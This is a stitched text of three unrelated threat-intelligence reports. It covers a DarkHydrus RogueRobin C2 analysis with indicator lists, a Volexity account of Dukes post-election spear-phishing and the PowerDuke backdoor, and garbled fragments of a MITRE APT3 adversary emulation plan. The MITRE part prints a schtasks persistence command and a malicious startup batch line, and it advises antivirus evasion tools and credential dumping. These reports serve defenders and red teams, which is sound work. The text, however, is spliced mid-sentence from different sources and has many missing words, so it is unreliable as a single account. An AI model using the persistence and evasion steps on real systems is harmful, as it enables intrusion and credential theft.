protocol using the TXT query mode, specifically by searching the data using the following regular expression:\\n\\\\”(\\\\\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>).\\\\”\\nWith the unique identifier value obtained from the file on Google Drive, the Trojan will attempt to obtain jobs using the Google Drive communications channel. To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4:\\nc<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain>\\nThe Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier. The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt. After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file. When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows:\\n<Google Drive URL in ‘gdu’> + <file identifier in ‘f_id’> + “?alt=media”\\nThe Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression:\\n([^r-v\\\\\\\\s]+)[r-v]([\\\\\\\\w\\\\\\\\d+\\\\\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)\\nThe Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected. It will use the data after the separator as the string that it will subject to the command handler seen in Table 5.\\nInfrastructure\\nThe initial list of C2 domains released by 360TIC associated with 513813af15… appeared thematically very similar to previous DarkHydrus activity, using domain names visually similar to well-known technology vendors or service providers. This list was further expanded upon by ClearSky Security (here, here and here) in a series of tweets that provided additional similar domain names also likely linked to DarkHydrus. To better understand how these domains are related to DarkHydrus, we began visually mapping the relationships between the list of domains, which can be seen in Figure 7. The diagram shows the DarkHydrus group using a consistent naming schema and structure in their infrastructure. They register a multitude of domains and set up nameservers to use as their primary DNS for their C2 domains.\\nFigure 7 Relational diagram of DarkHydrus infrastructure\\nFor this campaign, we are able to cluster the adversary infrastructure via the specific nameservers that were deployed for C2s. The brackets in Figure 7 shows the distinct clustering of infrastructure into three groups. We were able to retrieve live payloads associated with two of the clusters. A third cluster was also shared by ClearSky Security, but we were unable to associate a live payload to them. Although the third cluster does not appear to have any direct relationships to the other two clusters, it is still highly probable that this cluster is related to the two other clusters via the structuring of domains with custom nameservers. In addition, the domain names themselves were extremely similar, with some examples being exactly the same but on a different top level domain.\\nThe two sets of nameservers we were able to associate with the retrieved payloads were tbs1/tbs2.microsoftonline.services and tvs1/tvs2.trafficmanager.live. The distribution of C2 domains and their nameservers can be seen in Table 7.\\nSample(s)\\nf1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0\\n5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c\\nDNS\\ntbs1/tbs2.microsoftonline.services\\nDomains\\n0ffice365[.]agency\\n0ffice365[.]life\\n0ffice365[.]services\\n0nedrive[.]agency\\ncorewindows[.]agency\\nmicrosoftonline[.]agency\\nonedrive[.]agency\\nsharepoint[.]agency\\nskydrive[.]agency\\nskydrive[.]services\\nSample\\neb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97\\nDNS\\ntvs1/tvs2.trafficmanager.live\\nDomains\\nakamaiedge[.]live\\nakamaized[.]live\\nakdns[.]live\\nedgekey[.]live\\nTable 7: Sample and Domain Associations\\nThe third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other. Each of the domains appeared to have rotated through the six nameservers but oddly, one of the nameservers that several of the domains had rotated through did not appear to be currently registered. Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123. This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure. This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name.\\nConclusion\\nThe DarkHydrus group continues their operations and adds new techniques to their playbook. Recent DarkHydrus delivery documents revealed the group abusing open-source penetration testing techniques such as the AppLocker bypass. The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShell-based RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig. Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure.\\nPalo Alto Networks customers are already be protected via:\\nAll samples in this report have a malicious verdict in WildFire\\nDomains have been classified as malicious\\nAutoFocus tags are available for additional context: DarkHydrus and RogueRobin\\nIndicators of Compromise\\nDelivery Document SHA256\\n513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8\\ne068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022\\n4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8\\nRogueRobin SHA256\\neb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97\\nf1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0\\n5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c\\nRogueRobin C2s\\nakdns[.]live\\nakamaiedge[.]live\\nedgekey[.]live\\nakamaized[.]live\\n0ffice365[.]agency\\n0nedrive[.]agency\\ncorewindows[.]agency\\nmicrosoftonline[.]agency\\nonedrive[.]agency\\nsharepoint[.]agency\\nskydrive[.]agency\\n0ffice365[.]life\\n0ffice365[.]services\\nskydrive[.]services\\nskydrive[.]agency\\nNameservers\\ntvs1.trafficmanager[.]live\\ntvs2.trafficmanager[.]live\\ntbs1.microsoftonline[.]services\\ntbs2.microsoftonline[.]services\\nbrit.ns.cloudfronts[.]services\\ndns.cloudfronts[.]services\\nns2.akadns[.]services\\nbritns.akadns[.]services\\nbritns.akadns[.]live\\nns2.akadns[.]live\\nRelated Domains\\niecvlist-microsoft[.]live\\ndata-microsoft[.]services\\nasimov-win-microsoft[.]services\\nonecs-live[.]services\\nakamaiedge[.]services\\nphicdn[.]world\\nazureedge[.]today\\nnsatc[.]agency\\nAkamai[.]agency\\nt-msedge[.]world\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

Volexity observed five different attack waves with a heavy focus on U.S.-based think tanks and non-governmental organizations (NGOs). These e-mails came from a mix of attacker created Google Gmail accounts and what appears to be compromised e-mail accounts at Harvard’s Faculty of Arts and Sciences (FAS). These e-mails were sent in large quantities to different individuals across many organizations and individuals focusing in national security, defense, international affairs, public policy, and European and Asian studies. Two of the attacks purported to be messages forwarded on from the Clinton Foundation giving\\xa0 insight and perhaps a postmortem analysis into the elections. Two of the other attacks purported to be eFax links or documents pertaining to the election’s outcome being revised or rigged. The last attack claimed to be a link to a PDF download on “Why American Elections Are Flawed.” Volexity believes a group it refers to as The Dukes (also known as APT29 or Cozy Bear) is responsible for post-election attack activity.\\nBackground\\nSince August of this year, Volexity has been actively involved in investigating and tracking several attack campaigns from the Dukes. Most notably the Dukes have previously been tied to the breach of the Democratic National Committee (DNC) and intrusions into multiple high-profile United States Government organizations. In July 2015, the Dukes started heavily targeting\\xa0 think tanks and NGOs. This represented a fairly significant shift in the group’s previous operations and one that continued in the lead up to and immediately after the 2016 United States Presidential election.\\nOn August 10, 2016 and August 25, 2016, the Dukes launched several waves of highly targeted spear phishing attacks against several U.S.-based think tanks and NGOs. These spear phishing messages were spoofed and made to appear to have been sent from real individuals at well-known think tanks in the United States and Europe. These August waves of attacks purported to be from individuals at Transparency International, the Center for a New American Security (CNAS),\\xa0 the International Institute for Strategic Studies (IISS), Eurasia Group, and the Council on Foreign Relations (CFR).\\nThe Dukes are known for launching their attacks by sending links to ZIP files, that contain malicious executables, hosted on legitimate compromised web servers. However, each of the e-mail messages from the August attacks contained a Microsoft Office Word (.doc) or Excel (.xls) attachment. These attachments, when viewed, contained legitimate report content from each of the organizations they appeared to have been sent from. However, the attackers inserted macros into the documents designed to install a malware downloader on the system. Successful exploitation would result in the download of a PNG image file from a compromised webserver. These attack campaigns leveraged steganography in the PNG files by hiding components of a backdoor that would exist only in memory after being loaded into rundll32.exe. Volexity has dubbed this backdoor PowerDuke. Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets. Details of these attacks have been provided to Volexity customers. Concerned NGO’s and Universities that may have been targeted by these attacks campaigns are welcome to reach out for additional details.\\nNovember 9 – Post-Election Spear Phishing Waves\\nThe post-election attacks launched by the Dukes on November 9 were very similar to previous attacks seen from the Dukes in both 2015 and 2016. The PowerDuke malware, first seen in August 2016, was once again used in these most recent attacks. Three of the five attack waves contained links to download files from domains that the attackers appear to have control over. The other two attacks contained documents with malicious macros embedded within them. Each of these different attack waves were slightly different from one another and are detailed below.\\nAttack Wave 1: eFax – The “Shocking” Truth About Election Rigging\\nThe first attack wave is similar to much older attacks from the Dukes that purport to be an electronic Fax. This message claims to have been sent from Secure Fax Corp. and has a link to a ZIP file that contains a Microsoft shortcut file (.LNK). This shortcut file contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. The e-mail message was sent from the attacker controlled e-mail account industry.faxsolution@gmail.com. The screen shot below shows the e-mail that was sent.\\nThe e-mail contained links pointing to the following URL:\\nhxxp://efax.pfdweek[.]com/eFax/message0236.ZIP\\nInside of this password (1854) protected ZIP file is a Microsoft shortcut file named:\\n37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\\nNote that pfdweek[.]com appears to be under the control of the attackers but may be a hijacked domain.\\nDetails on each of the files are included below.\\nFilename: message0236.ZIP\\nFile size: 643843 bytes\\nMD5 hash: bea0a6f069bd547db685698bc9f9d25a\\nSHA1 hash: ee09bec09388338134d47fa993d5e0f86efe5bd4\\nNotes:\\xa0Password protected ZIP file containing malicious Microsoft shortcut file (37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk)\\nFilename: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\\nFile size: 724003 bytes\\nMD5 hash: c272aebc661c54cc960ba9a4a3578952\\nSHA1 hash: 52d62213c66a603e33dab326bf4fa29d6ac681c4\\nNotes:\\xa0Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.\\nFilename:\\xa0kxwn.lock\\nFile size:\\xa0 10752 bytes\\nMD5 hash: 28b95a2c399e60ee535c32e73860fbea\\nSHA1 hash: bf4ce67b6e745e26fcf3a2d41938a9dff1395076\\nNotes: Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to “%APPDATA\\\\Roaming\\\\Microsoft\\\\” with persistence via HKCU Run Key “WebCache” (rundll32.exe\\xa0%APPDATA\\\\Roaming\\\\Microsoft\\\\kxwn.lock , #2).

This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. The Macros contain several anti-VM checks designed to avoid executing in virtualized environments.

The e-mail purports to have been sent from Harvard’s “PDF Mobile Service” or “PFD Mobile Service”. The spelling of this non-existent service is inconsistent in the e-mail.\\xa0 The latter spelling appears to be a typographical error that is consistent with the domain names registered by the attackers.

The link in the e-mail points to a ZIP file that has a Microsoft shortcut file (.LNK) inside of it. This shortcut file contains PowerShell commands that conduct anti-VM checks, drop a backdoor, and launch a clean decoy document. Like Attack Wave #3, this e-mail message also purported to be forwarded from Laura Graham at the Clinton Foundation. The message body contained dozens of e-mail addresses to which the message originally claims to have been sent, with organizations similar to Attack Wave #3. The e-mail message from this attack wave, with identifying information removed, is shown below.\\nAs seen in the screen shot above, the e-mail contained links pointing to the following URL:\\nhxxp://efax.pfdregistry[.]net/eFax/37486.ZIP\\nInside of this password (6190) protected ZIP file a Microsoft Shortcut file named:\\n37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\\nNote that\\xa0pfdregistry[.]net appears to be under the control of the attackers but may be a hijacked domain.\\nDetails on the malware components of this attack wave are included below.\\nFilename: 37486.ZIP\\nFile size: 580688 bytes\\nMD5 hash: f79caf27a99c091e6c1775b306993341\\nSHA1 hash: a76c02c067eae26d78f4b494274dfa6aedc6fa7a\\nNotes: Password protected ZIP file containing malicious Microsoft shortcut file 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk.\\nFilename: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\\nFile size: 661782 bytes\\nMD5 hash: f713d5df826c6051e65f995e57d6817d\\nSHA1 hash: 68ce4c0324f03976247ff48803a7d988f9f9f43f\\nNotes: Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.\\nFilename: hqwhbr.lck\\nFile size: 10752 bytes\\nMD5 hash: 57c627d68e156676d08bfc0829b94331\\nSHA1 hash: 4bcbf078a78ba0e842f78963ba9dd71240ab6a6d\\nNotes: PowerDuke backdoor file dropped to “%APPDATA\\\\Roaming\\\\Skype\\\\” with persistence via HKCU Run Key “IAStorIcon” (rundll32.exe\\xa0%APPDATA\\\\Roaming\\\\Apple\\\\hqwhbr.lck, #2).\\xa0 Connects directly to 177.10.96.30:443 for command and control.\\nFilename: hqwhbr.lck:schemas\\nFile size: 547636 bytes\\nMD5 hash: cbf96820dc74a50a91b2b8b94376682a\\nSHA1 hash: 5f105801a1abb398dadc756480713f9bd7a4aa73\\nNotes: Alternate data stream (ADS) PNG\\xa0 file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).\\nThe PowerDuke Backdoor\\nThe PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system. Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files. Several commands supported by PowerDuke facilitate getting information about the system.\\nA previous analysis of PowerDuke showed it supported the following commands.\\ncomp\\nget the NetBIOS name via GetComputerNameEx\\ndomain\\nget the computer’s domain via NetWkstaGetInfo\\ndrives\\nget logical drives, drive type, free space, serial number, etc.\\nfsize\\nget the size of a file via GetFileAttributesExW or failing that, by mapping the file and getting the size\\nkill\\nstop a process via TerminateProcess\\nmemstat\\nget memory usage status via GlobalMemoryStatusEx, total RAM, percent used, etc.\\nosdate\\nget the time the machine was built (via InstallDate registry key)\\nosver\\nget OS info via registry, such as ProductName, CurrentBuild, CurrentVersion, CSDBuildNumber, etc.\\npslist\\nlist processes via CreateToolhelp32Snapshot\\npwd\\nget current directory via GetCurrentDirectoryW\\nrun\\nstart a process via CreateProcessW\\n#\\nruns cmd.exe /c and gets the output via Named Pipe and sends the data back\\nsiduser\\ngets the current user’s SID via GetTokenInformation and LookupAccountSidW\\ntime\\nthe time + timezone (GetLocalTime and GetTimeZoneInformation)\\nuptime\\nnumber of seconds since the last boot\\nuser\\nthe user’s name via GetUserNameExW\\nwipe\\nwrites random data across a file, then deletes the file\\nwnd\\ngets the text of the current foreground window\\nfgetp\\ndownload file\\nfputp\\nupload file\\npower\\nreboot or shutdown (via previously loaded PowrProf.dll)\\ncdt\\nchange to temporary directory\\nreqdelay\\nsleep for specified time\\nVolexity has not fully examined the PowerDuke instances from these campaigns but has noted the malware appears to support the following additional commands not described above:\\nsidcomp\\nbuzy\\nexit\\ncopy\\ndetectav\\nmkdir\\nsoftware\\nshlist\\nshinfo\\nshdel\\nshadd\\nsetpng\\nconn\\nsetsrv\\nVolexity may update this post following further PowerDuke analysis.\\nNetwork Indicators\\nBelow are network indicators associated with download URLs for the aforementioned Dukes attack campaigns.\\nHostname\\nIP Address\\nASN Information\\nefax.pfdresearch.org\\n81.82.196.162\\n6848 | 81.82.0.0/15 | TELENET | BE | telenet.be | Telenet Operaties N.V.\\nefax.pfdregistry.net\\n65.15.88.243\\n7018 | 65.15.64.0/19 | ATT-INTERNET4 | US | bellsouth.net | Bellsouth.net Inc.\\nefax.pfdweek.com\\n84.206.44.194\\n31581 | 84.206.0.0/16 | KOPINT | HU | ekg.kopdat.hu | National Infocommunications Service Company Limited by Shares\\nBelow are network indicators associated with command and control servers for the aforementioned Dukes attack campaigns.\\nIP Address\\nASN Information\\n185.124.86.121\\n43260 | 185.124.86.0/24 | DGN | TR | – | –\\n185.132.124.43\\n43260 | 185.132.124.0/24 | DGN | TR | – | –\\n185.26.144.109\\n60721 | 185.26.144.0/24 | BURSABIL | TR | bursabil.com.tr | Bursabil Konfeksiyon Tekstil Bilisim Teknoloji insaat Sanayi ve Ticaret Limited Sirketi\\n173.243.80.6\\n14979 | 173.243.80.0/24 | AERONET-WIRELESS | PR | aeronetpr.com | Aeronet Wireless\\n177.10.96.30\\n262848 | 177.10.96.0/21 | Naja | BR | najatel.com.br | Naja Telecomunicacoes Ltda.\\nConclusion\\nThe Dukes continue to launch well-crafted and clever attack campaigns. They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels. The group’s anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure. This combined with their use of steganography to hide their backdoor within PNG files that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future.\\nFollow us on Twitter:\\xa0@Volexity, @stevenadair, @5ck, @imhlv2, @attrc\\nAPT, Dukes, elections, spear phishing\\nSearch for:\\nRecent Posts\\nEvil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant\\nStorm Cloud Unleashed: Tibetan Focus of Highly Targeted Fake Flash Campaign\\nMicrosoft Exchange Control Panel (ECP) Vulnerability CVE-2020-0688 Exploited\\nVulnerable Private Networks: Corporate VPNs Exploited in the Wild\\nDigital Crackdown: Large-Scale Surveillance and Exploitation of Uyghurs\\nArchives\\nApril 2020\\nMarch 2020\\nSeptember 2019\\nNovember 2018\\nSeptember 2018\\nAugust 2018\\nJuly 2018\\nJune 2018\\nApril 2018\\nNovember 2017\\nJuly 2017\\nMarch 2017\\nNovember 2016\\nOctober 2015\\nJuly 2015\\nJune 2015\\nApril 2015\\nOctober 2014\\nSeptember 2014\\nTags\\nHong Kong digital surveillance Scanbox spear phishing exploits vulnerabilities VPN Dukes crimeware Cisco Gh0st Drupal java China APT Afghanistan Adobe Flash elections Japan Scanning\\n© 2020 Volexity.

All Rights Reserved 2 - 1 Overview In an effort to advance the practice of security testing through adversary emulation and adversarial engineering, we present this emulation plan to be used by an adversary emulation team looking to emulate the threat group commonly known as APT3. The plan includes the gr have been documented in publicly available threat reporting. To ground the plan in a common taxonomy, it is based on the MITRE ATT&CK model 1 . The scope of this emulat ion plan covers the adversary lifecycle, beginning with initial network compromise and ending with exfiltration. It discusses tools, methods, style, tradecraft, and end state objectives. Historically, i nformation about attackers on - target actions and goal s have been difficult to obtain and APT3 reporting is no exception ; however, the document bases instructions off publicly accessible sources whenever possible, focusing on sources that could be cross - referenced to some degree. To fill the intel gaps, the a uthors relied on their experience in threat intelligence and adversary emulation for best - estimates. Threat reporting sources vary widely, and correlation of activity to a threat group is not straightforward, and as such the authors have worked to ensure reputable sources are referenced. While many threat intelligence sources work to provide information t hat is as accurate as possible to the community, there is still an inherent risk that third - party threat reporting may provide inaccurate information. Note: Within this document, italicized text represents notes. These notes represent comments that are no concessions that have been made to make the emulation instructions practical or to indicate where inconsistent or nonexistent reporting has required gaps to be filled in with best - guess e stimates of adversary behavior. References are indicated in - line with bracketed numbers [#] and listed at the end of this document.

All Rights Reserved 2 - 2 Adversary Objectives : Reporting indicates APT3 actors are interested in exfiltration of documents [3] . They have been known to target printers and file shares [3] . They also target intellectual property, often industrial in nature. [4] . Background : APT3 is a China - based threat group. APT3 has traditionally targeted a myriad of US and international targets; however, reporting dated September 2016 indicates the group shifted focus around March 2016 to target Hong Kong organizations [3] . 1. Initial Setup of command and control (C2), defense evasion techniques, and getting initial compromise 2. Discovery, privilege escalation, lateral movement, persistence, and execution 3. Collection, data staging, and exfiltration Figure 1 APT3\\'s Three Phases of Action T hese phases are broken up into more detail in the following sections. The next section is about the tools that APT3 uses for their operations, how to emulate them, and what ATT&CK tactics and techniques they correspond to. Command - line examples, as well as descriptions of what the APT3 Adversary Emulation Field Manual reference. 2.1 APT3 To ols APT3 uses a combination of custom and openly available tools. Because custom adversary tools can have hidden functionality, be difficult to tailor to new environments, or utilize server - side controllers which may be unavailable, recommendations are mad e for replacements that can accurately perform similar activity. Adversary emulators and defenders should be aware that Approved for Public Release; Distribution Unlimited. Case Number 17 - 3569 . ©2018 The MITRE Corporation.

There are lots of ways to accomplish the same objectives with built - in Windows tools, but the focus for APT3 tends to be on more simplistic tools rather than more advanced Windows utilities like WMIC, WinRM, and PowerShell. The following table describes how to emulate the tools as well as detailing which ATT&CK Tactics are represented by them.

Emulation Phases APT3 disseminates spam - like phishing campaigns with vari ous payload delivery methods [1] . Once on a machine, the actors collect information about the victim such as connected users [14] and analyze it for its value, trying to determine where they landed and what access they have. Admin access is an obvious main target due to the increased access it will likely provide . The ac tors then drop multiple backdoors, usually 2 - 4 on the initial system and 5+ versions within the first few hops, with independent C2 profiles for redundancy [ Redundant Access T1108 ] . Next they then dump as many credentials as possible, and quickly continue spreading throughout the network. They specifically go after file servers and print servers [1] [3] oved to all the machines they think have value, they collect all the documents they want, package them up and password protect them, and exfiltrate them out of the o rganization [15] . In some cases, e been known to persist within a network for very lengthy periods wit hout ever exfiltrating data. The sections below show how APT3 acts through their entire lifecycle. Phase 1 documents what happens during initial compromise, phase 2 highlights techniques used during network propagation, and phase 3 documents one way they have been known to perform exfiltration. 3.1 Phase 1 Initial Compromise The goal of the Initial Compromise phase is to achieve successful code execution and control of a system within the t arget environment. APT3 primarily conducts initial compromise using spear phishing, delivering implants through both malicious attachments and malicious links. They have used new 0 - days on multiple browsers [15] . They have targeted existing 0 - days in Internet Explorer [2] , Windows [2] , and Flash [14] . They have also been known to compromise weakly secured legitimat e websites to which users are directed through spear phishing emails [16] . Approved for Public Release; Distribution Unlimited.

All Rights Reserved 3 - 12 3.1.1 Implant Command and Control APT3 implants issue command and control (C2) traffic as HTTP GET requests that beacon at set interval s [14] . The HTTP Cookie field contains information for the C2 server, which responds with a webpage that contains the command encoded within a specific HTML tag [15] . APT3 implants have also been known to use custom binary protocols [2] . Pirpi.2014 and Pirpi.2015 both contain several kinds of sleep and anti - sandbox strategies that cause the RAT to pause between executions [15] . Some of the Pirpi instances have been known to also use SSL for their communications and even include public/priva te keys within the binaries [17] . This level of C2 accompanying Malleable C2 profile modeled on [14] . 3.1.2 Defense Evasion or modified to prevent detection. anti - disassembly techniques [3] , including requiring certain command li ne parameters to run [17] . These a re defense evasion techniques that APT3 sets up before getting initial acc ess to the target environment. It is recommended to use anti - antivirus (AV) capabilities to prevent AV detection of commonly available tools. If Sandboxing is a problem, possibly en crypt tools to bypass sandboxing. An example of this would be Veil - E vasion [18] or Artifact Kit [19] . ATTACK techniques: T1027 Ob fuscated Files or Information , T1045 Software Packing , T1066 Indicator Removal from Tools. 3.1.3 Initial Access For Initial Compromise, both web server drive - tradecraft. The Social Engineering Toolkit (free) [20] and Cobalt Strike (paid) [6] have features tha t support these methods. 3.1.3.1 Case 1 Spear Phishing with Browser Exploit [2] In late November 2014 an APT3 campaign used a spear phishing email (see Appendix A) containing a link to a malicious site. The site contained JavaSc ript that triggered CVE - 2014 - 6332 (an Internet Explorer exploit [21] ) which launched a VBscript and PowerShell based payload. an CVE - 2014 - 4113 (a Windows Kernel exploit [22] ) cmd.exe /C whoami schtasks /create /tn \"my sc\" /tr C: \\\\ Users \\\\ Public \\\\ test.exe /sc ONLOGON /ru \"System\" The first command is used to check that the process is running as SYSTEM. The second establishes persistence via S chtasks. Approved for Public Release; Distribution Unlimited. Case Number 17 - 3569 . ©2018 The MITRE Corporation.

Clicking on this link led to a download of 3.1.3.3 Spear Phishing with Malicious RAR Attachment [7] In atta cks reported in June 2014, APT3 actors sent a RAR archive as an email attachment. It contained a resume and program purported to be written by the job candidate. The program, ttcalc.exe, contained a legitimate version of TTCalc but also dropped Pirpi to: % USERPROFILE%/Application Data/mt.dat And a bat file that was saved at [ T1064 Scripting ]: %USERPROFILE%/Start Menu/Programs/Startup/vc.bat The bat file contained the following script: @echo off cmd.exe /C start rundll32.exe \"C: \\\\ Documents and Settings \\\\ admin \\\\ Application Data \\\\ mt.dat\" UpdvaMt The bat file will be triggered when the user logged in and would have caused Pirpi to start with rundll32 [ T1085 Rundll32 ]. 3.1.3.4 Spear Phishing with Malicious RAR Attachment [7] Reported in June 2014, APT3 actors sent an encrypted self - extracting RAR attachment. The RAR contained a trojanized setup program w hich attempts to drop and run ttcalcBAK.exe another self - extracting RAR which drops a DLL version of the PlugX RAT at: %ALLUSERSPROFILE% \\\\ chrome_frame_helper Approved for Public Release; Distribution Unlimited.

In both cases the Flash exploit loaded the payload (the Pirpi RAT) from specially crafted GIF images. 3.1.3.6 Victim Profiling [16] Reported in July 2015, APT3 used spear phising to direct targets to a compromised site. This site had ScanBox installed which was used to profile the victims and in some cases, deliver exploits to selected victims. 3.2 Phase 2 - Network Propagation The goal of the Network Propagation phase is to identify and move to desired systems within the target enviro nment with the intention of discovering credentials and documents for exfiltration. Publicly - existent. One report that discusses general characteristics of APT3 is [23] , but it is uncertain what data sources were used to compile the listed TTPs. Aside from that report we draw conclusions of how APT3 operates based on the capabilities of Pirpi and other tools that they are reported to use. There a re some persistence techniques that they have used during Initial Compromise that can be applied to Network Propagation. Despite this, there are significant gue sses or recommendations. The process within this phase can be described with the below diagram. Each step within this phase is broken out by ATT&CK tactic and the corresponding APT3 specific techniques documented in reports. A command - line reference for e mulating the specific ATT&CK techniques with built - in Windows utilities, Cobalt Strike, and Metasploit can be found in the APT3 Adversary Emulation Field Manual Approved for Public Release; Distribution Unlimited.

All Rights Reserved 3 - 16 a heavy emphasis on enumerating users in these special grou [ T1087 Account Discovery ]. When doing discovery, certain actions are very closely intertwined (as shown grouped together in the above diagram). Querying the T1069 Permission Groups Discovery ] returns the users that are members of that g part of any other interesting groups [ T1087 Account Discovery ]. This process can repeat for a while as all interesting users and groups are enumerated. Similarly, querying systems for their configuration [T1016 System Network Configuration Discovery ] an d their current network connections [ T1049 System Network Connections Discovery ] are heavily integrated. 3.2.1.2 Local Privilege Escalation Credential dumping and persistence may require local privilege escalation if the attacker does not have control of a high integrity process; however, the only reporting available on local p rivilege e scalation methods u sed by APT3 is CVE - 2014 - 4113 [2] . It is possible that their strong reliance on credential access (detailed later) allows them to use credentials with increasing levels of access in place of other local privilege escalation mechanisms. Their perceived focus during this phase, however, is on finding credentials that allow direct admin permissions. In this case, control falls through to cr edential access or persistence. D uring an engagement , adversary emulators may find it necessary to pe rform local privilege escalation due to time constraints . M ost common frameworks (including Metasploit and Cobalt Strike) contain some methods for privilege escalation. Also, UACBypass [24] and PowerUp [9] are common and freely available tools that may be used to perform Privilege Escalation.

All Rights Reserved 3 - 17 3.2.1.3 Persistence APT3 has used multiple methods for persistence: creating a service [23] ( T1050 - New Service ), creating a scheduled task [2] (T1053 - Scheduled Task), and also by placing scripts in the Startup Folder [7] [ T1060 - Registry Run Keys/Start Folder ]. APT3 has replaced the Sticky Keys binary ( C: \\\\ Windows \\\\ System32 \\\\ sethc.exe ) with cmd.exe [ T1015 - Accessibility Features ] and enabled Remote Desktop Protocol (RDP) if it is not already enabled [ T1076 Remote Desktop Protocol ]. This specific P ersistence technique has an added benefit of a llowing an operator to open a command prompt when connected over RDP without having to provide valid credentials [23] . APT3 has been known to create or en able accounts, for and add them to the local admin group [23] [ T1136 Create Account ]. Presumably this is done for easier future access. Recommendation: On new hosts, establish p ersistence by creating a service or schta sk s . On systems where RDP capabilities are desired, it might also be useful to enable s ticky k eys and RDP . 3.2.1.4 Credential Access APT3 uses many forms of credential access. They used customized versions of pwdump, and later a custom compiled version of mimikatz, to search for cached Windows credentials [ T1003 - Credential Dumping ] as well as ChromePass and Lazagne [ ( T1081 - Credentials in Files ], to search though browser and other credential caches. Their pwdump tool inj ects itself into lsass.exe and is executed by running the GetHas h export of the lsremora.dll [3] Mimikatz is used to dump plaintext credentials by injecting into lsass.exe. [ T1003 - Credential Dumping ]. They also install a keylogger, which can be used to discover credentials and remote systems [ T1056 - Inp ut Capture ]. This keylogger installs itself as a service and records keystrokes in encrypted files such as thumbcache_96.dbx [ T1027 Obfuscated Files or Information ] [3] .

All Rights Reserved 3 - 18 3.2.2 Lateral Movement Though publicly reported information on how APT3 enumerates machines aside from related commands in dsquery to do so. This may be due to a lack of available information on how APT3 operates during an operation since most reports tend to be focused on forensic information. Pirpi has commands that list servers in the domain, list TC P connections and retrieve connected users (T1049 - Network Connections Discovery), and list Domain Controllers (T1018 - Remote System Discovery). Some of this information may be used to identify target hosts for lateral movement. In addition to built - in W indows utilities, there are some open source tools which collect similar information. APT3 will quickly spread to other machines as fast as possible, often checking for easy password reuse by [ T1078 Valid Accounts ] [ T1077 - Windows Admin Shares ] [ T1110 Brute Force ] . APT3 prioritizes file and printer servers. Remote Copy and Execution APT3 uses a custom tool called RemoteCMD that can run protocol(s) are being used, but RemoteCMD supports file operations (upload, download, delete and rename) service operations (creation, deletion, start an d stop) and scheduled tasks ( AT , schtasks). Presumably these are done over SMB (files), Remote Service (services) and Remote Schtasks (AT).

